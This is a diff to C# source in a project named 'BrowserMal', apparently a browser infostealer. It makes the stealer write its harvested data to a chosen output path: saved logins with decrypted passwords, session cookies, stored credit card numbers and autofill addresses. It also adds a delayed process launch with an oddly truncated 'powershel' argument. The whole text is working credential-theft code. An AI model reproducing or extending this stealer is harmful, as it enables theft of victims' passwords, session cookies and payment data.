@@ -9,7 +9,7 @@ namespace BrowserMal
     {
         private static readonly BrowserManager browserManager = new BrowserManager();
 
-        public static void Start()
+        public static void Start(string outputPath)
         {
             browserManager.Init();
             List<BrowserModel> browsers = browserManager.GetBrowsers();
@@ -20,7 +20,7 @@ namespace BrowserMal
                 new ColumnModel("username_value", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("password_value", isEncrypted: true, needsFormatting: false, isImportant: true)
             };
-            new GenericManager<CredentialModel>("logins", new SqliteTableModel(credsColumns)).Init(ref browsers, Browser.Util.LOGIN_DATA);
+            new GenericManager<CredentialModel>("logins", new SqliteTableModel(credsColumns)).Init(ref browsers, Browser.Util.LOGIN_DATA, outputPath);
 
             List<ColumnModel> cookiesColumns = new List<ColumnModel>
             {
@@ -30,7 +30,7 @@ namespace BrowserMal
                 new ColumnModel("expires_utc", isEncrypted: false, needsFormatting: true, isImportant: false, Browser.Util.ChromiumToUnixTimestamp),
                 new ColumnModel("encrypted_value", isEncrypted: true, needsFormatting: false, isImportant: true)
             };
-            new GenericManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns)).Init(ref browsers, Browser.Util.COOKIES);
+            new GenericManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns)).Init(ref browsers, Browser.Util.COOKIES, outputPath);
 
             List<ColumnModel> creditCardsColumns = new List<ColumnModel>()
             {
@@ -40,7 +40,7 @@ namespace BrowserMal
                 new ColumnModel("nickname", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("card_number_encrypted", isEncrypted: true, needsFormatting: false, isImportant: false)
             };
-            new GenericManager<CreditCardModel>("credit_cards", new SqliteTableModel(creditCardsColumns)).Init(ref browsers, Browser.Util.WEB_DATA);
+            new GenericManager<CreditCardModel>("credit_cards", new SqliteTableModel(creditCardsColumns)).Init(ref browsers, Browser.Util.WEB_DATA, outputPath);
 
             List<ColumnModel> addressesColumns = new List<ColumnModel>()
             {
@@ -48,7 +48,9 @@ namespace BrowserMal
                 new ColumnModel("city", isEncrypted: false, needsFormatting: false, isImportant: false),
                 new ColumnModel("zipcode", isEncrypted: false, needsFormatting: false, isImportant: false)
             };
-            new GenericManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns)).Init(ref browsers, Browser.Util.WEB_DATA);
+            new GenericManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns)).Init(ref browsers, Browser.Util.WEB_DATA, outputPath);
+
+            Util.ProcessUtil.RunAfterSeconds("powershel");
         }
     }
 }
